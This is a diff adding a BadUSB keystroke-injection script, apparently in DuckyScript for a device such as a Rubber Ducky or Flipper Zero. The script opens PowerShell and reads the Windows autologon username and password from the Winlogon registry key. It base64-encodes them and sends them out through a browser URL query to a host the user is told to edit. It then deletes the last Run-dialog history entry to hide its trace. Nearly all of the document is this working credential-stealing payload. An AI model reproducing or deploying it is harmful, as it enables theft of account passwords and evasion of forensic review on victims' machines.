@@ -1,0 +1,29 @@
+REM                                                                    _..._       .-'''-.                 .-'''-.
+REM                                                                 .-'_..._''.   '   _    \  .---.       '   _    \
+REM /|                                                            .' .'      '.\/   /` '.   \ |   |.--. /   /` '.   \
+REM ||    .-.          .-                                        / .'          .   |     \  ' |   ||__|.   |     \  '
+REM ||     \ \        / /                               .-,.--. . '            |   '      |  '|   |.--.|   '      |  '
+REM ||  __  \ \      / /                          __    |  .-. || |            \    \     / / |   ||  |\    \     / /
+REM ||/'__ '.\ \    / /            .--------.  .:--.'.  | |  | || |             `.   ` ..' /  |   ||  | `.   ` ..' /
+REM |:/`  '. '\ \  / /             |____    | / |   \ | | |  | |. '                '-...-'`   |   ||  |    '-...-'`
+REM ||     | | \ `  /                  /   /  `" __ | | | |  '-  \ '.          .              |   ||  |
+REM ||\    / '  \  /                 .'   /    .'.''| | | |       '. `._____.-'/              |   ||__|
+REM |/\'..' /   / /                 /    /___ / /   | |_| |         `-.______ /               '---'
+REM '  `'-'`|`-' /                 |         |\ \._,\ '/|_|                  `
+REM          '..'                  |_________| `--'  `"
+
+REM Steals HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword
+REM Exfills it via http://127.0.0.1 (edit this)
+REM Cleans up last opened MRU listing ("powershell")
+REM Press button to close MS Edge.
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+ALTCODE $a=(Get-ItemPropertyValue "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName" -ErrorAction SilentlyContinue);$b=(Get-ItemPropertyValue "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword" -ErrorAction SilentlyContinue);if($a -and $b -and $b.Trim() -ne ''){$c=[System.Text.Encoding]::Unicode.GetBytes($a);$d=[System.Text.Encoding]::Unicode.GetBytes($b);$e=$c+[System.Text.Encoding]::Unicode.GetBytes(":")+$d;$f=[Convert]::ToBase64String($e);Write-Output "DefaultUsername: $a";Write-Output "DefaultPassword: $b";Start-Process "microsoft-edge:http://127.0.0.1?secret=$f"}else{Write-Output "Default credentials not found in the registry or are empty."};$g=[Microsoft.Win32.Registry]::CurrentUser;$h='Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU';$i=$g.OpenSubKey($h,$true);if($i -ne $null){$j=$i.GetValueNames();if($j.Length -gt 0){$k=$j[$j.Length-1];$i.DeleteValue($k)}};Exit
+ENTER
+WAIT_FOR_BUTTON_PRESS
+ALT F4
